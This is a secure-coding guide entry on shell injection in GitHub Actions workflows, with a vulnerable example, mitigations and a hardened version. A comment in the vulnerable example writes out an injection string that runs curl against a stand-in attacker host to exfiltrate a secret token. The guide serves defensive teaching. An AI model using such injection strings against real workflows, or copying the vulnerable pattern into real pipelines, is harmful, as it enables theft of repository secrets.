# Shell Injection

## Description

Workflows that pipe user-controlled input directly to shell interpreters (bash, sh, zsh) without validation create code injection vulnerabilities: attackers can inject malicious commands that execute with the workflow's permissions, enabling secret exfiltration, file modification, or system compromise. Shell injection is particularly dangerous when user input from pull requests, issues, or workflow inputs is used in shell commands. [^gh_actions_security]

## Vulnerable Instance

- Workflow uses user input (from PR titles, issue comments, or workflow inputs) directly in shell commands.
- Input is piped to shell interpreters without validation or sanitization.
- Attacker can inject malicious shell commands.

```yaml
name: Process Input
on:
  pull_request:
jobs:
  process:
    runs-on: ubuntu-latest
    steps:
      - name: Process PR title
        run: |
          echo "${{ github.event.pull_request.title }}" | bash
          # Attacker can inject: "; curl attacker.com/steal?token=$SECRET; #"
```

## Mitigation Strategies

1. **Validate and sanitize input**  
   Validate input against allowlists, sanitize special characters, and use parameterized commands. Never pipe user input directly to shell interpreters.

2. **Use environment variables**  
   Pass user input through environment variables instead of direct interpolation. Access via `$VARIABLE` in commands rather than `${{ github.event... }}` in the command string.

3. **Download and verify scripts first**  
   If executing scripts, download to files, verify checksums, review script content, and only then execute verified scripts.

4. **Store scripts in repository**  
   Store scripts in the repository rather than downloading from the internet or constructing from user input. This allows code review and version control.

5. **Use GitHub Actions**  
   Prefer GitHub Actions instead of shell scripts constructed from user input. Actions are more transparent and can be pinned to specific versions.

6. **Use containerized execution**  
   Run untrusted code in containers with minimal privileges. Isolate execution environments to limit blast radius.

### Secure Version

```yaml
name: Process Input Safely
on:
  pull_request:
jobs:
  process:
    runs-on: ubuntu-latest
    steps:
      - name: Process PR title
        env:
          PR_TITLE: ${{ github.event.pull_request.title }}
        run: |
          # Validate input
          if [[ ! "$PR_TITLE" =~ ^[a-zA-Z0-9\s-]+$ ]]; then
            echo "Invalid input"
            exit 1
          fi
          echo "Processing: $PR_TITLE"  # Safe - validated
```

## Impact

| Dimension | Severity | Notes |
| --- | --- | --- |
| Likelihood | ![High](https://img.shields.io/badge/-High-orange?style=flat-square) | Shell injection is common when workflows process user input, especially from pull requests or issues. |
| Risk | ![Critical](https://img.shields.io/badge/-Critical-red?style=flat-square) | Injected shell commands run with workflow permissions, enabling secret exfiltration, code modification, or full system compromise. |
| Blast radius | ![Wide](https://img.shields.io/badge/-Wide-yellow?style=flat-square) | Compromised workflows can affect all systems the workflow can access, including repositories, secrets, and deployment targets. |

## References

- GitHub Docs, "Security hardening for GitHub Actions," https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions [^gh_actions_security]

---

[^gh_actions_security]: GitHub Docs, "Security hardening for GitHub Actions," https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions
